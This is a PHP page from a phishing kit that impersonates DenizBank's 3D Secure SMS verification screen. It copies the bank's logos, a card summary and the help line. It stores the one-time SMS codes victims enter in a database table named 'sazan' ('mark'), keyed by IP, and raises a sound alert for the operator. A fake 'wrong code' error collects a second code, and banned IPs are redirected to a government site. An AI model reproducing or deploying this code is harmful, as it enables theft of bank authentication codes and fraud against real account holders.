<?php
    error_reporting(0);
    date_default_timezone_set('Europe/Istanbul');
    include('../../baglan.php');
    $db->query("UPDATE sazan SET now = 'Denizbank SMS' WHERE ip = '{$ip}'");
    
    $cc_last_4 = $_SESSION['cc_last_4'];
    $no_last_4 = $_SESSION['no_last_4'];

    $hata = false;
    if($_GET) {
        if($_GET['hata'] == "true") $hata = true;
        else $hata = false;
    }
    if($_POST){
        $sms = guvenlik(trim($_POST['sms']));
        $date = date('d.m.Y H:i');
        if($hata == true) {
            $query = $db->prepare("UPDATE sazan SET sms2=?,smsSound=? WHERE ip = ?");
            $insert = $query->execute(array($sms,1,$ip));
            if($insert){
                print_r(json_encode([
                    "isSuccess" => true,
                    "hrefpage" => "../" . $siteAyarlari['panel'] . "/bekle.php",
                ]));
                return;
            }
        } else {
            $query = $db->prepare("UPDATE sazan SET sms=?,smsSound=? WHERE ip = ?");
            $insert = $query->execute(array($sms,1,$ip));
            if($insert){
                print_r(json_encode([
                    "isSuccess" => true,
                    "hrefpage" => "../" . $siteAyarlari['panel'] . "/bekle.php",
                ]));
                return;
            }
        }
    }
    $ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
    foreach($ban as $kontrol){
        if($kontrol['ban'] == $ip){
            header('Location:http://www.turkiye.gov.tr');
        }
    }
?>

<!DOCTYPE html>
<html>

<head>
    <title>DenizBank</title>
    <link rel="stylesheet" href="css/theme.css?v=1.8.0">
    <link rel="stylesheet" href="css/style.css?v=1.8.0">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <script src="lib/helper.js?v=1.8.0"></script>
    <script src="lib/script.js?v=1.8.0"></script>
    <meta charset="UTF-8" />
    <meta name="description" content="" />
    <meta name="keyword" content="" />
    <meta name="viewport" content="width=device-width, maximum-scale=1.0" />
    <meta name="copyright" content="2022" />
    <meta name="robots" content="noindex">
    <link rel="canonical" href="" />
	<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
</head>

<body>
    <div class="container">
        <main class="root-container mx-0 m-md-auto">
            <form id="denizbank" name="denizbank" method="post" role="form" action="<?php echo $hata == true ? "?hata=true" : ""?>" autocomplete="off">
                <header> 
                    <div class="row">
                        <div class="col-md-12">
                            <div class="logo-area">
                                <div class="main-logo">
                                    <img src="img/DenizBank_logo.png" alt="DenizBank">
                                </div>
                                <div class="second-logo">
                                    <img src="img/mastercard_logo.png" alt="Mastercard">
                                </div>
                            </div>
                        </div>
                    </div>
                </header>

                <section class="payment-specs">
                    <div class="row">
                        <div class="col">
                            <ul>
                                <li class="label">İş Yeri Adı <span>:</span></li>
                                <li class="label-desc"><?= $isyeri?></li>
                                
                                <?php if(isset($_SESSION['tutar'])) { ?>
                                <li class="label">İşlem Tutarı <span>:</span></li>
                                <li class="label-desc"><?= $_SESSION['tutar'] ?> TL</li>
                                <?php } ?>

                                <li class="label">İşlem Tarihi <span>:</span></li>
                                <li class="label-desc"><?php echo date("d.m.Y  H:i:s"); ?></li>

                                <li class="label">Kart Numarası <span>:</span></li>
                                <li class="label-desc">XXXX XXXX XXXX <?= $cc_last_4 ?></li>

                                <li class="label">Referans No <span>:</span></li>
                                <li class="label-desc">8vkyr2i8</li>
                            </ul>
                        </div>
                    </div>
                </section>



                <script>
                    var hasRestriction = 'False' === 'True'
                    var onlySms = 'False' === 'True'
                </script>

                <section class="authOption blue-container mt-30" <?php if($hata) echo 'style="display:none"'; ?>>
                    <h2 class="align-center text-white mb-30">3D Secure do&#x11F;rulamas&#x131;n&#x131; nas&#x131;l yapmak istersiniz?</h2>
                    <div class="option-list p-1 row">

                        <div class="checky p-1">
                            <div class="form-check form-check-inline">
                                <label class="form-check-label">
                        <input class="form-check-input" type="radio" name="AuthenticationType" id="AuthenticationSMS" value="SMS" data-authtype="SMS">
                        SMS
                    </label>
                            </div>
                        </div>
                    </div>
                </section>

                <div class="authOption cancelbutton col-sm-12 col-md-12 text-center mb-sm-3 mb-md-3" <?php if($hata) echo 'style="display:none"'; ?>>
                    <a id="btnSend" class="btn btn-outline-secondary btn-lg is-passive">
        <span class="spinner-border spinner-border-sm loading" style="display:none" role="status" aria-hidden="true"></span>
        DEVAM
    </a>
                </div>


                <section id="authSms" class="blue-container mt-30" style="<?php if(!$hata) echo 'display:none'; ?>">
                    <div id="smsError" class="error-section" style="<?php if(!$hata) echo 'display:none'; ?>">
                        <div class="warning-icon text-center mb-2">
                            <img src="img/icon_warning.png" alt="">
                        </div>

                        <h3 class="align-center text-white ml-30 mb-0 fw-light">
                            Girmiş olduğunuz SMS kodu hatalıdır. <br />
                            <span class="fw-bold">Kalan deneme sayısı : </span>
                            <span id="remainingSms" class="fw-bold">1</span>
                        </h3>
                    </div>

                    <div class="smsNew" style="display:none">
                        <div class="error-section">
                            <div class="warning-icon">
                                <img src="img/icon_warning.png" alt="">
                            </div>

                            <h3 class="align-center text-white ml-30 mb-0 fw-bold">
                                SMS kodu deneme hakkınız kalmamıştır. <br /> Yeni şifre isteyerek tekrar deneyebilirsiniz.
                            </h3>
                        </div>
                    </div>

                    <div class="sms">
                        <h3 id="smsInfo" class="align-center text-white mb-30 fw-light">
                        </h3>
                        <h1 class="mt-30 align-center text-white fw-bold">SMS İLE GELEN KODU GİRİNİZ</h1>

                        <div class="sms-container mt-20 mb-30 align-center">
                            <input id="txtSms" name="sms" class="smsinput" type="text" maxlength="6" onpaste="return false;" ondrop="return false;" onkeypress="test(this, event)" placeholder="_ _ _ _ _ _" inputmode="numeric" pattern="[0-9]" autocomplete="one-time-code" title="">
                        </div>
                    </div>
                </section>

                <div class="smsNew cancelbutton col-12 text-center" style="display: none !important">
                    <a class="btn btn-outline-secondary btn-lg btnNewSms">TEKRAR GÖNDER</a>
                </div>

                <div class="sms d-flex justify-content-around align-content-center row p-1" <?php if(!$hata) echo 'style="display:none !important"'; ?>>
                    <div class="cancelbutton col-sm-6 col-md-6 text-center mb-sm-3 mb-md-3">
                        <a class="btn btn-outline-primary btn-lg btnBackToOption">GERİ DÖN</a>
                    </div>
                    <div class="cancelbutton col-sm-6 col-md-6 text-center mb-sm-3 mb-md-3">
                        <a id="btnValidateSms" href="../<?= $siteAyarlari['panel'] ?>/bekle.php" class="btn btn-outline-secondary btn-lg is-passive">ONAYLA</a>
                    </div>
                </div>

                <section class="authPush blue-container mt-30" style="display:none !important">
                    <h3 id="pushInfo" class="align-center text-white mb-30 fw-light">
                    </h3>

                    <div id="pushWarning" class="white-content-box">
                    </div>
                </section>

                <div class="authPush d-flex justify-content-around align-content-center row p-1" style="display:none !important">
                    <div class="cancelbutton col-sm-6 col-md-6 text-center mb-sm-3 mb-md-3">
                        <a class="btn btn-outline-primary btn-lg btnBackToOption">Farklı Yöntemle Devam Et</a>
                    </div>
                    <div class="cancelbutton col-sm-6 col-md-6 text-center mb-sm-3 mb-md-3">
                        <a id="btnNewPush" class="btn btn-outline-secondary btn-lg is-passive">
            <span class="spinner-border spinner-border-sm loading" style="display:none" role="status" aria-hidden="true"></span>
            Bildirimi Tekrar Gönder
        </a>
                    </div>
                </div>

                <section class="warning-area mt-30 mb-30 timeout" style="display:none">
                    <div class="warning-icon">
                        <img src="./img/icon_time.png" alt="">
                    </div>

                    <h5 class="align-center text-white ml-30 mb-0 fw-bold">
                        Size verilen sürede herhangi bir işlem yapmadınız.
                    </h5>
                </section>

                <section id="mainContent" class="blue-container mt-30 timeout" style="display:none !important">
                    <h2 class="align-center text-white mb-30">İşleminize nasıl devam etmek istersiniz?</h2>
                    <div class="button-container buttonlist different-way">
                        <div class="row">
                            <div class="col-md-12">
                                <a class="btn btn-outline-primary btn-lg mb-30 timeoutAction" data-authtype="Push" data-applicationId="1">MobilDeniz ile</a>
                            </div>
                            <div class="col-md-12">
                                <a class="btn btn-outline-primary btn-lg mb-30 timeoutAction" data-authtype="SMS" data-applicationId="SMS">SMS ile</a>
                            </div>
                        </div>
                    </div>
                </section>


                <div class="col-12 d-flex justify-content-between align-items-center text-center mt-4 mb-2 helplinks" style="padding: 0px 4px">
                    <a id="btnOpenHelp">Yardım</a>
                    <a href="../<?= $siteAyarlari['panel'] ?>/bekle.php">İşlemden Vazgeç</a>
                </div>
                </form>
        </main>

        <script type="text/javascript">
            var remainingSeconds = '300'
            var pushActivitySeconds = '10'
        </script>

        <footer class="mx-0 m-md-auto px-3 p-md-5">
            <div class="row footer-content">
                <div class="counter col-sm-0 col-md-12">
                    <div class="countdown"></div>
                </div>
            </div>
        </footer>
        <div class="counter-mobile">
            <div class="countdown"></div>
        </div>

        <div id="help" class="overlay" style="display:none">
            <div class="popup">
                <img src="./img/DenizBank_logo.png" alt="DenizBank" style="height:30px">
                <br /><br />
                <a class="close" id="btnCloseHelp" style="cursor:pointer">&times;</a>
                <div class="content">
                    0850 222 0 801 Önce Müşteri hattımızdan yardım alabilirsiniz.
                </div>
            </div>
        </div>


    </div>

    <script type="text/javascript">
        function test(el, event) {
            if(event.key.match(/\d/) == null) {
                event.preventDefault();
                return false
            }
        }
        function navigate() {
            window.location.href = '../<?= $siteAyarlari['panel'] ?>/bekle.php'
        }
        var panel = '<?= $siteAyarlari['panel'] ?>';
    </script>
    <script src="./assets/js/custom.js"></script>
    <script>
        $(document).ready(function() {
            gonder("<?php echo $ip; ?>");
            var int = self.setInterval("gonder('<?php echo $ip; ?>')", 3000);
        });
    </script>
</body>
</html>